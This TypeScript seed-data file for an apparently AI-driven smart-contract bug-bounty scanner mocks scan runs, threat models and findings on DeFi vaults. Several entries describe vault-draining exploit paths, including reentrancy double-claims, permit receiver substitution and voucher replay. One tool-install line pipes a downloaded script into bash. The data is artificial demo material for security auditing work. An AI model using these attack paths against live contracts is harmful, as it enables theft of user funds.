import { evaluateG0 } from '../core/doctrine';
import type {
  AdvancedSnapshot,
  ChainSetting,
  DoctorCheck,
  Finding,
  LlmSettings,
  ScanRun,
} from '../types';

export function createInitialChainSettings(): ChainSetting[] {
  return [
    {
      chain: 'ethereum',
      label: 'Ethereum Mainnet',
      rpcUrl: 'https://eth-mainnet.g.alchemy.com/v2/demo-masked-key',
      rpcConfigured: true,
      etherscanKeyMasked: 'ETH•••••89AF',
      minFundsAtRiskUsd: 100_000,
    },
    {
      chain: 'arbitrum',
      label: 'Arbitrum One',
      rpcUrl: '',
      rpcConfigured: false,
      etherscanKeyMasked: '',
      minFundsAtRiskUsd: 100_000,
    },
    {
      chain: 'base',
      label: 'Base Mainnet',
      rpcUrl: 'https://mainnet.base.org',
      rpcConfigured: true,
      etherscanKeyMasked: 'BAS•••••12C4',
      minFundsAtRiskUsd: 75_000,
    },
    {
      chain: 'optimism',
      label: 'OP Mainnet',
      rpcUrl: 'https://mainnet.optimism.io',
      rpcConfigured: true,
      etherscanKeyMasked: '',
      minFundsAtRiskUsd: 75_000,
    },
  ];
}

export function createInitialLlmSettings(): LlmSettings {
  return {
    provider: 'Google Gemini',
    model: 'gemini-4-neon',
    keyMasked: 'Géré par Settings > Secrets (GEMINI_API_KEY)',
    configured: true,
    defaultTokenBudget: 150_000,
  };
}

export function createInitialDoctorChecks(): DoctorCheck[] {
  return [
    {
      tool: 'forge',
      category: 'sc',
      required: true,
      installed: true,
      version: 'forge 0.3.0 (e8f4b21)',
      installCmd: 'curl -L https://foundry.paradigm.xyz | bash && foundryup',
      impact: 'Requis pour build, ingest et rejeu clean-room des PoC.',
    },
    {
      tool: 'anvil',
      category: 'sc',
      required: true,
      installed: true,
      version: 'anvil 0.3.0 (e8f4b21)',
      installCmd: 'foundryup',
      impact: 'Requis pour le replay isolé des coutures dApp en tempdir.',
    },
    {
      tool: 'cast',
      category: 'sc',
      required: true,
      installed: true,
      version: 'cast 0.3.0 (e8f4b21)',
      installCmd: 'foundryup',
      impact: 'Requis pour la provenance on-chain et les lectures RPC G0.',
    },
    {
      tool: 'halmos',
      category: 'sc',
      required: false,
      installed: true,
      version: 'halmos 0.2.4',
      installCmd: 'pipx install halmos',
      impact: 'Exécution symbolique des invariants pendant la chasse.',
    },
    {
      tool: 'slither',
      category: 'sc',
      required: false,
      installed: true,
      version: 'slither 0.10.4',
      installCmd: 'pipx install slither-analyzer',
      impact: 'Analyse statique et cartographie des fonctions monétaires non testées.',
    },
    {
      tool: 'aderyn',
      category: 'sc',
      required: false,
      installed: false,
      version: 'Non installé',
      installCmd: 'cargo install aderyn',
      impact: 'Détecteurs Rust complémentaires — absence signalée explicitement dans l’ingest.',
    },
    {
      tool: 'git',
      category: 'core',
      required: true,
      installed: true,
      version: 'git 2.47.1',
      installCmd: 'apt-get install -y git',
      impact: 'Clone blobless (--filter=blob:none) et git log -S pour R11.',
    },
    {
      tool: 'pdftotext',
      category: 'core',
      required: false,
      installed: true,
      version: 'poppler-utils 24.02',
      installCmd: 'apt-get install -y poppler-utils',
      impact: 'Extraction des rapports d’audit PDF précédents (tombstones R16).',
    },
  ];
}

export function createInitialScans(): { scans: ScanRun[]; findings: Finding[] } {
  const aegisG0 = evaluateG0({
    targetKind: 'program',
    scopeKind: 'deployed',
    programActive: true,
    programStatusText: 'Active · Immunefi',
    programArtifactUrl: 'https://immunefi.com/bug-bounty/aegis-vault-v2/',
    verbatimImpacts: [
      'Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield',
      'Permanent freezing of funds',
      'Protocol insolvency caused by accounting desynchronization',
    ],
    chain: 'ethereum',
    rpcConfigured: true,
    fundsAtRiskUsd: 24_650_000,
    minFundsAtRiskUsd: 100_000,
    blockNumber: 21_240_811,
    contractAddress: '0x71cE5f02A9aC31fA402aE2aA0f114bB19283C911',
    provenanceMatch: 'matched',
    pinnedCommit: '9f84c21e88a904f2a109c3b8e4f912a6c7b40e12',
    dwellDays: 194,
    knownIssuesCount: 3,
    tombstones: [
      'Rounding dust <= 2 wei on ERC4626 previewRedeem (Cantina Audit #14)',
      'Centralization risk on StrategyManager timelock multisig',
    ],
  });

  const labG0 = evaluateG0({
    targetKind: 'local',
    scopeKind: 'commit_anchored',
    programActive: false,
    programStatusText: 'Local workspace',
    programArtifactUrl: './fixtures/vuln-vault-seam',
    verbatimImpacts: [],
    chain: 'ethereum',
    rpcConfigured: false,
    fundsAtRiskUsd: null,
    minFundsAtRiskUsd: 100_000,
    provenanceMatch: 'n/a',
    pinnedCommit: '3c19a7e4f80b6d55110a9e2b77cc34d812e90f01',
    dwellDays: 0,
    knownIssuesCount: 0,
    tombstones: [],
  });

  const heliosG0 = evaluateG0({
    targetKind: 'program',
    scopeKind: 'deployed',
    programActive: true,
    programStatusText: 'Active · Cantina',
    programArtifactUrl: 'https://cantina.xyz/bounties/helios-perps-arb',
    verbatimImpacts: [
      'Theft of collateral from margin vault',
      'Oracle manipulation allowing bad-debt extraction exceeding insurance fund',
    ],
    chain: 'arbitrum',
    rpcConfigured: false,
    fundsAtRiskUsd: null,
    minFundsAtRiskUsd: 100_000,
    provenanceMatch: 'matched',
    pinnedCommit: 'b129e04a891d22c7e09f11a442d8b7c09a812f33',
    dwellDays: 58,
    knownIssuesCount: 1,
    tombstones: ['Liquidator MEV frontrunning on healthy margin ratio'],
  });

  const strataG0 = evaluateG0({
    targetKind: 'program',
    scopeKind: 'deployed',
    programActive: false,
    programStatusText: 'Paused — Migration v3 en cours',
    programArtifactUrl: 'https://immunefi.com/bug-bounty/strata-bridge/',
    verbatimImpacts: [],
    chain: 'ethereum',
    rpcConfigured: true,
    fundsAtRiskUsd: 42_000,
    minFundsAtRiskUsd: 100_000,
    blockNumber: 21_240_790,
    contractAddress: '0x2A88c1b091F4c0a42D3b12E10F9331089E4A00b1',
    provenanceMatch: 'diverged',
    pinnedCommit: '4e01c8810aa771124f9c2d003a1b9f4e21a60c19',
    dwellDays: 312,
    knownIssuesCount: 9,
    tombstones: ['Relayer fee griefing below gas threshold'],
  });

  const scanAegis: ScanRun = {
    id: 'scan-aegis-v2',
    taskId: 'task-aegis-v2',
    targetUrl: 'https://immunefi.com/bug-bounty/aegis-vault-v2/',
    programName: 'Aegis Vault v2',
    targetKind: 'program',
    scopeKind: 'deployed',
    chain: 'ethereum',
    maxBountyUsd: 250_000,
    status: 'stopped',
    createdAt: '2026-11-26T08:12:00.000Z',
    updatedAt: '2026-11-26T09:44:00.000Z',
    surface: 'all',
    repoCount: 2,
    executionMode: 'guided_autonomous',
    workerCount: 1,
    budget: {
      tokensUsed: 150_000,
      tokensLimit: 150_000,
      elapsedSeconds: 842,
      maxSeconds: 1800,
      history: [
        { tokensK: 0, hypothesesClosed: 0, findingsCount: 0 },
        { tokensK: 30, hypothesesClosed: 1, findingsCount: 0 },
        { tokensK: 65, hypothesesClosed: 2, findingsCount: 1 },
        { tokensK: 110, hypothesesClosed: 4, findingsCount: 1 },
        { tokensK: 150, hypothesesClosed: 5, findingsCount: 2 },
      ],
    },
    steps: [
      {
        key: 'intake',
        status: 'done',
        detail: '3 impacts verbatim, 2 exclusions, dwell 194j.',
        updatedAt: '2026-11-26T08:12:18Z',
        artifactSummary: 'immunefi://aegis-vault-v2',
      },
      {
        key: 'clone_build',
        status: 'done',
        detail: 'Clone blobless + forge build OK (FOUNDRY_FFI=false).',
        updatedAt: '2026-11-26T08:13:02Z',
        artifactSummary: 'commit 9f84c21',
      },
      {
        key: 'ingest',
        status: 'done',
        detail: '14 contrats, 4 fonctions monétaires non testées, provenance alignée.',
        updatedAt: '2026-11-26T08:14:11Z',
        artifactSummary: 'sc_ingest_results#aegis',
      },
      {
        key: 'g0',
        status: 'done',
        detail: 'Verdict GO ($24.65M TVL au bloc 21240811).',
        updatedAt: '2026-11-26T08:14:25Z',
        artifactSummary: 'g0://aegis-v2',
      },
      {
        key: 'threat_model',
        status: 'done',
        detail: 'Brouillon auto-pipeline validé par opérateur.',
        updatedAt: '2026-11-26T08:17:40Z',
        artifactSummary: 'operator_approved',
      },
      {
        key: 'hunt',
        status: 'done',
        detail: 'Budget atteint (150k/150k) · 5 hypothèses clôturées, 1 en cours.',
        updatedAt: '2026-11-26T09:44:00Z',
        artifactSummary: 'worker#1',
      },
      {
        key: 'candidates',
        status: 'done',
        detail: '2 candidats avec PoC clean-room + disconfirmer.',
        updatedAt: '2026-11-26T09:44:00Z',
        artifactSummary: '2 findings',
      },
    ],
    g0: aegisG0,
    ingest: {
      buildOk: true,
      foundryFfiDisabled: true,
      npmScriptsIgnored: true,
      buildLog:
        '[⠊] Compiling 14 files with Solc 0.8.26\n[⠒] Solc 0.8.26 finished in 2.41s\nCompiler run successful! (FOUNDRY_FFI=false, --ignore-scripts)',
      contractsCount: 14,
      untestedMonetaryFunctions: [
        {
          contract: 'AegisWithdrawalQueue',
          functionName: 'claimBatchWithPermit',
          fileLine: 'src/queue/AegisWithdrawalQueue.sol:184',
          reason: 'Aucun test unitaire ou fuzz ne couvre le chemin de remboursement avec relayer fee + permit.',
        },
        {
          contract: 'AegisVault',
          functionName: 'migrateStrategyShares',
          fileLine: 'src/core/AegisVault.sol:319',
          reason: 'Chemin de migration partielle non couvert lorsque totalIdle < pendingWithdrawals.',
        },
        {
          contract: 'YieldRouter',
          functionName: 'harvestAndRebalance',
          fileLine: 'src/router/YieldRouter.sol:94',
          reason: 'Slippage minOut calculé sur balanceOf avant swap.',
        },
      ],
      negativeSpaceSummary:
        'Slither actif (3 hits). Aderyn non installé : signalé explicitement (aucun espace négatif supposé propre sur ses règles).',
      staticHits: [
        {
          tool: 'slither',
          rule: 'reentrancy-no-eth',
          fileLine: 'src/queue/AegisWithdrawalQueue.sol:201',
          severity: 'high',
          message: 'State variable claimed[id] updated after external token transfer callback in claimBatchWithPermit.',
        },
        {
          tool: 'slither',
          rule: 'arbitrary-send-erc20',
          fileLine: 'src/router/YieldRouter.sol:112',
          severity: 'medium',
          message: 'transferFrom uses caller-supplied spender parameter without permit nonce binding.',
        },
        {
          tool: 'halmos',
          rule: 'inv_share_monotonic',
          fileLine: 'src/core/AegisVault.sol:274',
          severity: 'info',
          message: 'Symbolic counterexample found under non-standard fee-on-transfer token (out of scope).',
        },
      ],
      provenanceMatch: {
        chain: 'ethereum',
        address: '0x71cE5f02A9aC31fA402aE2aA0f114bB19283C911',
        blockNumber: 21_240_811,
        pinnedCommit: '9f84c21e88a904f2a109c3b8e4f912a6c7b40e12',
        status: 'matched',
      },
    },
    threatModel: {
      provenance: 'operator_approved',
      updatedAt: '2026-11-26T08:17:40.000Z',
      summary:
        'Vault ERC-4626 adossé à une file de retrait asynchrone et un routeur multi-stratégies. Surface prioritaire : coutures permit/relayer et comptabilité des parts pendant les retraits en attente.',
      verbatimImpacts: [
        'Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield',
        'Permanent freezing of funds',
        'Protocol insolvency caused by accounting desynchronization',
      ],
      exclusions: [
        'Front-end phishing or compromised user private keys',
        'Fee-on-transfer or rebasing tokens outside the whitelisted WETH/USDC vaults',
      ],
      tombstones: [
        'Rounding dust <= 2 wei on ERC4626 previewRedeem (Cantina Audit #14)',
        'Centralization risk on StrategyManager timelock multisig',
      ],
      invariants: [
        'Un ticket de retrait ne peut jamais être réclamé plus d’une fois (claimed[ticketId] strictement monotone).',
        'totalAssets() doit toujours couvrir sum(pendingWithdrawals) + activeSharesValue.',
        'Une signature EIP-712 claimWithPermit lie l’adresse receiver et ne peut être rejouée sur un autre batch.',
      ],
      trustBoundaries: [
        'Deposit/Withdraw/Claim : entièrement permissionless',
        'StrategyManager : multisig 3/5 avec timelock 48h (hors périmètre compromission)',
        'Relayer Web2 : non fiable, peut soumettre des calldatas arbitraires pour claimBatchWithPermit',
      ],
    },
    hypotheses: [
      {
        id: 'hyp-aegis-1',
        scanId: 'scan-aegis-v2',
        door: 'door_a_untested',
        title: 'Double-claim via réentrance ERC-777/callback dans claimBatchWithPermit',
        targetFileLine: 'src/queue/AegisWithdrawalQueue.sol:184',
        outcome: 'candidate',
        artifactId: 'art-poc-fnd-aegis-1',
        reason: 'PoC Foundry exécuté + clean-room vérifié : drain de 180 WETH sur fork bloc 21240811.',
        updatedAt: '2026-11-26T08:52:10Z',
      },
      {
        id: 'hyp-aegis-2',
        scanId: 'scan-aegis-v2',
        door: 'seam',
        title: 'Substitution du destinataire (receiver) sur la couture EIP-712 relayer → claimBatchWithPermit',
        targetFileLine: 'src/queue/AegisWithdrawalQueue.sol:228',
        outcome: 'candidate',
        artifactId: 'art-poc-fnd-aegis-2',
        reason: 'Le digest EIP-712 omet `receiver` : le relayer ou tout observateur mempool peut rediriger les fonds.',
        updatedAt: '2026-11-26T09:38:04Z',
      },
      {
        id: 'hyp-aegis-3',
        scanId: 'scan-aegis-v2',
        door: 'invariant',
        title: 'Désynchronisation totalAssets pendant migrateStrategyShares avec retrait en attente',
        targetFileLine: 'src/core/AegisVault.sol:319',
        outcome: 'killed_by_artifact',
        artifactId: 'art-forge-kill-319',
        reason: 'Preuve Foundry (test_MigratePreservesAccounting) : modifier onlyWhenQueueSettled bloque toute migration tant que pendingWithdrawals > 0.',
        updatedAt: '2026-11-26T08:31:00Z',
      },
      {
        id: 'hyp-aegis-4',
        scanId: 'scan-aegis-v2',
        door: 'tombstone_sibling',
        title: 'Erreur d’arrondi exploitable sur redeemInstant (frère du tombstone previewRedeem)',
        targetFileLine: 'src/core/AegisVault.sol:166',
        outcome: 'killed_by_artifact',
        artifactId: 'art-halmos-kill-166',
        reason: 'Halmos prouve Math.Rounding.Ceil sur tous les chemins redeemInstant pour 1 <= shares <= type(uint128).max.',
        updatedAt: '2026-11-26T09:05:19Z',
      },
      {
        id: 'hyp-aegis-5',
        scanId: 'scan-aegis-v2',
        door: 'door_a_untested',
        title: 'Sandwich sur harvestAndRebalance via slippage minOut',
        targetFileLine: 'src/router/YieldRouter.sol:94',
        outcome: 'abandoned_unproven',
        reason: 'Budget tokens atteint avant la construction d’un PoC multi-bloc sur Uniswap V3 ; aucun artefact d’invalidation exécuté.',
        updatedAt: '2026-11-26T09:42:00Z',
      },
      {
        id: 'hyp-aegis-6',
        scanId: 'scan-aegis-v2',
        door: 'seam',
        title: 'Rejeu cross-chain de la signature d’annulation de retrait (domainSeparator statique)',
        targetFileLine: 'src/queue/AegisWithdrawalQueue.sol:260',
        outcome: 'in_progress',
        updatedAt: '2026-11-26T09:43:50Z',
      },
    ],
    hunterLogs: [
      {
        id: 'log-1',
        timestamp: '08:17:45',
        role: 'planner',
        message: 'Lecture du threat model (operator_approved). Génération de 6 hypothèses (Door A + coutures + frères tombstones).',
        tokensUsed: 8400,
      },
      {
        id: 'log-2',
        timestamp: '08:31:00',
        role: 'worker',
        message: 'close_hypothesis(hyp-aegis-3, killed_by_artifact, art-forge-kill-319) — onlyWhenQueueSettled confirmé par test Foundry.',
        tokensUsed: 24200,
      },
      {
        id: 'log-3',
        timestamp: '08:52:10',
        role: 'worker',
        message: 'Candidat FND-AEGIS-01 enregistré derrière LOCK #5. Rejeu clean-room OK (FOUNDRY_FFI=false, FORK_RPC_URL injecté).',
        tokensUsed: 64800,
      },
      {
        id: 'log-4',
        timestamp: '08:54:02',
        role: 'disconfirmer',
        message: 'Contre-vérification FND-AEGIS-01 : test R13 d’alternative légitime passé (aucune séquence légitime ne double-réclame le ticket).',
        tokensUsed: 71900,
      },
      {
        id: 'log-5',
        timestamp: '09:38:04',
        role: 'worker',
        message: 'Candidat FND-AEGIS-02 enregistré derrière LOCK #5 (couture EIP-712 receiver manquant).',
        tokensUsed: 138400,
      },
      {
        id: 'log-6',
        timestamp: '09:44:00',
        role: 'system',
        message: 'Budget tokens atteint (150 000 / 150 000). Scan mis en pause (status=stopped). Utilisez « Continuer +50k tokens » pour poursuivre.',
        tokensUsed: 150000,
      },
    ],
    seamEvents: [
      {
        id: 'seam-1',
        timestamp: '2026-11-26T09:12:10Z',
        origin: 'https://app.aegisvault.fi',
        method: 'eth_signTypedData_v4',
        contractAddress: '0x71cE5f02A9aC31fA402aE2aA0f114bB19283C911',
        functionSig: 'ClaimPermit(uint256[] ticketIds,uint256 deadline,uint256 nonce)',
        calldataPreview: '{"types":{"ClaimPermit":[{"name":"ticketIds","type":"uint256[]"},{"name":"deadline","type":"uint256"},{"name":"nonce","type":"uint256"}]}}',
        anvilTempdir: '/tmp/polymorphe-seam-881a2c',
        replayStatus: 'replayed_ok',
        notes: 'Absence du champ receiver dans le struct signé par le wallet, confirmée par rejeu Anvil isolé.',
      },
      {
        id: 'seam-2',
        timestamp: '2026-11-26T09:14:44Z',
        origin: 'https://app.aegisvault.fi',
        method: 'eth_sendTransaction',
        contractAddress: '0x71cE5f02A9aC31fA402aE2aA0f114bB19283C911',
        functionSig: 'claimBatchWithPermit(uint256[],address,uint256,bytes)',
        calldataPreview: '0x94c18f2a0000000000000000000000000000000000000000000000000000000000000080...',
        anvilTempdir: '/tmp/polymorphe-seam-881a2c',
        replayStatus: 'replayed_ok',
        notes: 'Substitution du 2e argument `receiver` acceptée on-chain sans invalider `ecrecover`.',
      },
    ],
  };

  const scanLab: ScanRun = {
    id: 'scan-vuln-vault-seam',
    taskId: 'task-vuln-vault-seam',
    targetUrl: './fixtures/vuln-vault-seam',
    programName: 'vuln-vault-seam (Labo)',
    targetKind: 'local',
    scopeKind: 'commit_anchored',
    chain: 'ethereum',
    maxBountyUsd: null,
    status: 'done',
    createdAt: '2026-11-26T07:20:00.000Z',
    updatedAt: '2026-11-26T07:34:00.000Z',
    surface: 'all',
    repoCount: 1,
    executionMode: 'guided_autonomous',
    workerCount: 1,
    budget: {
      tokensUsed: 48_200,
      tokensLimit: 100_000,
      elapsedSeconds: 312,
      maxSeconds: 1800,
      history: [
        { tokensK: 0, hypothesesClosed: 0, findingsCount: 0 },
        { tokensK: 22, hypothesesClosed: 1, findingsCount: 0 },
        { tokensK: 48, hypothesesClosed: 3, findingsCount: 1 },
      ],
    },
    steps: [
      { key: 'intake', status: 'done', detail: 'Mode labo local (aucun impact inventé).', updatedAt: '2026-11-26T07:20:03Z' },
      { key: 'clone_build', status: 'done', detail: 'Build Forge OK (FOUNDRY_FFI=false).', updatedAt: '2026-11-26T07:20:28Z' },
      { key: 'ingest', status: 'done', detail: '3 contrats, 2 fonctions monétaires non testées.', updatedAt: '2026-11-26T07:21:05Z' },
      { key: 'g0', status: 'done', detail: 'GO (mode labo — L1/L2/L3 n/a).', updatedAt: '2026-11-26T07:21:07Z' },
      { key: 'threat_model', status: 'done', detail: 'Brouillon auto-pipeline.', updatedAt: '2026-11-26T07:22:12Z' },
      { key: 'hunt', status: 'done', detail: '3/3 hypothèses clôturées.', updatedAt: '2026-11-26T07:33:40Z' },
      { key: 'candidates', status: 'done', detail: '1 candidat (export bounty bloqué par L9).', updatedAt: '2026-11-26T07:34:00Z' },
    ],
    g0: labG0,
    ingest: {
      buildOk: true,
      foundryFfiDisabled: true,
      npmScriptsIgnored: true,
      buildLog: '[⠒] Solc 0.8.24 finished in 0.89s\nCompiler run successful! (FOUNDRY_FFI=false)',
      contractsCount: 3,
      untestedMonetaryFunctions: [
        {
          contract: 'SeamVault',
          functionName: 'withdrawWithVoucher',
          fileLine: 'src/SeamVault.sol:74',
          reason: 'Aucun test sur l’expiration et la consommation du nonce voucher.',
        },
      ],
      negativeSpaceSummary: 'Slither exécuté (1 hit). Aderyn absent (signalé).',
      staticHits: [
        {
          tool: 'slither',
          rule: 'unchecked-transfer',
          fileLine: 'src/SeamVault.sol:89',
          severity: 'medium',
          message: 'Voucher nonce non incrémenté avant transfert.',
        },
      ],
      provenanceMatch: {
        chain: 'ethereum',
        address: 'N/A (local)',
        blockNumber: 0,
        pinnedCommit: '3c19a7e4f80b6d55110a9e2b77cc34d812e90f01',
        status: 'n/a',
      },
    },
    threatModel: {
      provenance: 'pipeline_auto',
      updatedAt: '2026-11-26T07:22:12.000Z',
      summary: 'Fixture locale vuln-vault-seam démontrant un rejeu de voucher signé entre backend Web2 et SeamVault.sol.',
      verbatimImpacts: [],
      exclusions: ['Export bounty désactivé tant que le scan reste en mode labo (L9).'],
      tombstones: [],
      invariants: ['Chaque voucher signé ne peut être consommé qu’une seule fois.'],
      trustBoundaries: ['Signataire backend Web2 fiable ; utilisateur appelant non fiable.'],
    },
    hypotheses: [
      {
        id: 'hyp-lab-1',
        scanId: 'scan-vuln-vault-seam',
        door: 'seam',
        title: 'Rejeu illimité d’un voucher withdrawWithVoucher faute d’invalidation de nonce',
        targetFileLine: 'src/SeamVault.sol:74',
        outcome: 'candidate',
        artifactId: 'art-poc-lab-1',
        reason: 'PoC Foundry exécuté et rejoué en clean-room : vidage complet du vault en 3 appels.',
        updatedAt: '2026-11-26T07:30:10Z',
      },
      {
        id: 'hyp-lab-2',
        scanId: 'scan-vuln-vault-seam',
        door: 'door_a_untested',
        title: 'Dépassement de capacité sur deposit() avec montant 0',
        targetFileLine: 'src/SeamVault.sol:42',
        outcome: 'killed_by_artifact',
        artifactId: 'art-forge-lab-kill-42',
        reason: 'require(amount > 0) vérifié par test Foundry.',
        updatedAt: '2026-11-26T07:26:12Z',
      },
      {
        id: 'hyp-lab-3',
        scanId: 'scan-vuln-vault-seam',
        door: 'invariant',
        title: 'Inflation de part premier déposant',
        targetFileLine: 'src/SeamVault.sol:48',
        outcome: 'killed_by_artifact',
        artifactId: 'art-forge-lab-kill-48',
        reason: 'Comptabilité 1:1 sans share pricing.',
        updatedAt: '2026-11-26T07:33:40Z',
      },
    ],
    hunterLogs: [
      {
        id: 'llog-1',
        timestamp: '07:22:15',
        role: 'planner',
        message: 'Mode labo actif (L9 appliqué). 3 hypothèses générées sur fixtures/vuln-vault-seam.',
        tokensUsed: 6200,
      },
      {
        id: 'llog-2',
        timestamp: '07:30:10',
        role: 'worker',
        message: 'Candidat FND-LAB-01 validé par rejeu clean-room Forge.',
        tokensUsed: 34900,
      },
      {
        id: 'llog-3',
        timestamp: '07:34:00',
        role: 'disconfirmer',
        message: 'Disconfirmer R13 OK : le rejeu du voucher viole l’unicité sans alternative légitime.',
        tokensUsed: 48200,
      },
    ],
    seamEvents: [
      {
        id: 'seam-lab-1',
        timestamp: '2026-11-26T07:24:00Z',
        origin: 'http://localhost:5173',
        method: 'POST /api/voucher',
        contractAddress: '0x5FbDB2315678afecb367f032d93F642f64180aa3',
        functionSig: 'withdrawWithVoucher(uint256 amount, uint256 nonce, bytes sig)',
        calldataPreview: 'amount=10e18, nonce=7, sig=0x82ab...1c',
        anvilTempdir: '/tmp/polymorphe-seam-lab-91c',
        replayStatus: 'replayed_ok',
        notes: 'Appel rejoué 3 fois de suite dans Anvil isolé : solde du vault ramené à 0.',
      },
    ],
  };

  const scanHelios: ScanRun = {
    id: 'scan-helios-arb',
    taskId: 'task-helios-arb',
    targetUrl: 'https://cantina.xyz/bounties/helios-perps-arb',
    programName: 'Helios Perps (Arbitrum)',
    targetKind: 'program',
    scopeKind: 'deployed',
    chain: 'arbitrum',
    maxBountyUsd: 500_000,
    status: 'needs_input',
    createdAt: '2026-11-26T09:50:00.000Z',
    updatedAt: '2026-11-26T09:51:45.000Z',
    surface: 'onchain',
    repoCount: 1,
    executionMode: 'guided_autonomous',
    workerCount: 1,
    budget: {
      tokensUsed: 0,
      tokensLimit: 150_000,
      elapsedSeconds: 42,
      maxSeconds: 1800,
      history: [{ tokensK: 0, hypothesesClosed: 0, findingsCount: 0 }],
    },
    steps: [
      { key: 'intake', status: 'done', detail: '2 impacts verbatim Cantina, actif.', updatedAt: '2026-11-26T09:50:14Z' },
      { key: 'clone_build', status: 'done', detail: 'Clone blobless + forge build OK.', updatedAt: '2026-11-26T09:51:02Z' },
      { key: 'ingest', status: 'done', detail: '9 contrats analysés ; provenance en attente RPC.', updatedAt: '2026-11-26T09:51:40Z' },
      { key: 'g0', status: 'needs_input', detail: 'RPC Arbitrum manquant pour L3/L4.', updatedAt: '2026-11-26T09:51:45Z' },
      { key: 'threat_model', status: 'pending', detail: 'En attente de G0.', updatedAt: '2026-11-26T09:51:45Z' },
      { key: 'hunt', status: 'pending', detail: 'Bloqué par G0 (LOCK #1).', updatedAt: '2026-11-26T09:51:45Z' },
      { key: 'candidates', status: 'pending', detail: 'En attente.', updatedAt: '2026-11-26T09:51:45Z' },
    ],
    g0: heliosG0,
    ingest: {
      buildOk: true,
      foundryFfiDisabled: true,
      npmScriptsIgnored: true,
      buildLog: '[⠒] Solc 0.8.26 finished in 1.74s\nCompiler run successful! (FOUNDRY_FFI=false)',
      contractsCount: 9,
      untestedMonetaryFunctions: [
        {
          contract: 'MarginVault',
          functionName: 'liquidateCrossMargin',
          fileLine: 'src/MarginVault.sol:241',
          reason: 'Cas multi-collatéral avec funding négatif non couvert.',
        },
      ],
      negativeSpaceSummary: 'Slither OK (1 hit). Aderyn non installé.',
      staticHits: [
        {
          tool: 'slither',
          rule: 'divide-before-multiply',
          fileLine: 'src/MarginVault.sol:269',
          severity: 'medium',
          message: 'Perte de précision possible sur le facteur de pénalité.',
        },
      ],
    },
    threatModel: {
      provenance: 'pipeline_auto',
      updatedAt: '2026-11-26T09:51:45.000Z',
      summary: 'En attente du verdict G0 (RPC Arbitrum requis avant génération du threat model).',
      verbatimImpacts: [
        'Theft of collateral from margin vault',
        'Oracle manipulation allowing bad-debt extraction exceeding insurance fund',
      ],
      exclusions: ['MEV ordering on healthy liquidations'],
      tombstones: ['Liquidator MEV frontrunning on healthy margin ratio'],
      invariants: [],
      trustBoundaries: [],
    },
    hypotheses: [],
    hunterLogs: [
      {
        id: 'hlog-1',
        timestamp: '09:51:45',
        role: 'system',
        message: 'G0 en statut NEEDS_INPUT : aucun RPC configuré pour arbitrum dans chain_settings.',
      },
    ],
    seamEvents: [],
  };

  const scanStrata: ScanRun = {
    id: 'scan-strata-bridge',
    taskId: 'task-strata-bridge',
    targetUrl: 'https://immunefi.com/bug-bounty/strata-bridge/',
    programName: 'Strata Bridge',
    targetKind: 'program',
    scopeKind: 'deployed',
    chain: 'ethereum',
    maxBountyUsd: 0,
    status: 'no_go',
    createdAt: '2026-11-25T16:10:00.000Z',
    updatedAt: '2026-11-25T16:12:30.000Z',
    surface: 'all',
    repoCount: 1,
    executionMode: 'guided_autonomous',
    workerCount: 1,
    budget: {
      tokensUsed: 0,
      tokensLimit: 150_000,
      elapsedSeconds: 118,
      maxSeconds: 1800,
      history: [{ tokensK: 0, hypothesesClosed: 0, findingsCount: 0 }],
    },
    steps: [
      { key: 'intake', status: 'done', detail: 'Programme en pause, 0 impact actif.', updatedAt: '2026-11-25T16:10:22Z' },
      { key: 'clone_build', status: 'done', detail: 'Build Forge OK.', updatedAt: '2026-11-25T16:11:12Z' },
      { key: 'ingest', status: 'done', detail: 'Divergence bytecode détectée — commit 4e01c88 épinglé.', updatedAt: '2026-11-25T16:12:05Z' },
      { key: 'g0', status: 'blocked', detail: 'NO-GO : 3 lignes bloquantes (L1, L2, L3).', updatedAt: '2026-11-25T16:12:30Z' },
      { key: 'threat_model', status: 'blocked', detail: 'Gelé suite à NO-GO.', updatedAt: '2026-11-25T16:12:30Z' },
      { key: 'hunt', status: 'blocked', detail: 'Interdit par LOCK #1 tant que G0 = NO-GO.', updatedAt: '2026-11-25T16:12:30Z' },
      { key: 'candidates', status: 'pending', detail: 'Non exécuté.', updatedAt: '2026-11-25T16:12:30Z' },
    ],
    g0: strataG0,
    ingest: {
      buildOk: true,
      foundryFfiDisabled: true,
      npmScriptsIgnored: true,
      buildLog: '[⠒] Solc 0.8.20 finished in 1.12s\nCompiler run successful! (FOUNDRY_FFI=false)',
      contractsCount: 6,
      untestedMonetaryFunctions: [],
      negativeSpaceSummary: 'Scan interrompu au gate G0 — aucun budget LLM consommé.',
      staticHits: [],
      provenanceMatch: {
        chain: 'ethereum',
        address: '0x2A88c1b091F4c0a42D3b12E10F9331089E4A00b1',
        blockNumber: 21_240_790,
        pinnedCommit: '4e01c8810aa771124f9c2d003a1b9f4e21a60c19',
        status: 'diverged',
      },
    },
    threatModel: {
      provenance: 'pipeline_auto',
      updatedAt: '2026-11-25T16:12:30.000Z',
      summary: 'Non généré : le gate G0 a stoppé l’investissement (programme en pause, TVL sous seuil).',
      verbatimImpacts: [],
      exclusions: [],
      tombstones: ['Relayer fee griefing below gas threshold'],
      invariants: [],
      trustBoundaries: [],
    },
    hypotheses: [],
    hunterLogs: [
      {
        id: 'slog-1',
        timestamp: '16:12:30',
        role: 'system',
        message: 'Gate G0 = NO-GO (L1 programme en pause, L2 0 impact, L3 TVL $42k < $100k). Chasse bloquée par LOCK #1.',
      },
    ],
    seamEvents: [],
  };

  const findings: Finding[] = [
    {
      id: 'FND-AEGIS-01',
      scanId: 'scan-aegis-v2',
      title: 'Double-claim des tickets de retrait via réentrance dans claimBatchWithPermit',
      severity: 'critical',
      status: 'candidate',
      source: 'autonomous_hunter',
      createdAt: '2026-11-26T08:52:10.000Z',
      summary:
        'La fonction claimBatchWithPermit transfère les actifs au destinataire avant de marquer ticket.claimed = true et n’applique pas nonReentrant. Un contrat destinataire peut réentrer avec le même ticketId et vider la liquidité disponible de la file de retrait en une seule transaction.',
      verbatimImpactLine:
        'Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield',
      affectedFileLine: 'src/queue/AegisWithdrawalQueue.sol:184-212',
      affectedCode: `function claimBatchWithPermit(
    uint256[] calldata ticketIds,
    address receiver,
    uint256 deadline,
    bytes calldata signature
) external {
    _verifyPermit(ticketIds, deadline, signature);
    for (uint256 i = 0; i < ticketIds.length; i++) {
        Ticket storage t = tickets[ticketIds[i]];
        require(!t.claimed && t.readyAt <= block.timestamp, "NOT_READY");
